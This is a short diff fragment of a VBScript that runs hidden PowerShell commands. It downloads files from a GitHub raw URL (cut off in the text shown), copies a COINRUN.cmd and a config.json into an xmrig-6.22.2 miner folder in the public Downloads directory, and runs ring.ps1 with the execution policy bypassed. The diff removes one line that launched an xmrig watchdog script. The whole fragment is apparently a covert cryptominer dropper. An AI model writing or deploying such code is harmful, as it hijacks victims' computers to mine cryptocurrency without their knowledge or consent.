@@ -31,5 +31,4 @@ objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubu
 objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\COINRUN.cmd -Destination C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd -Force", 0, True
 objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\config.json -Destination C:\Users\Public\Downloads\xmrig-6.22.2\config.json -Force", 0, True
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\ring.ps1", 0, True
-objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\xmrig_watchdog.ps1", 0, True
 objShell.Run "powershell.exe exit", 0, False
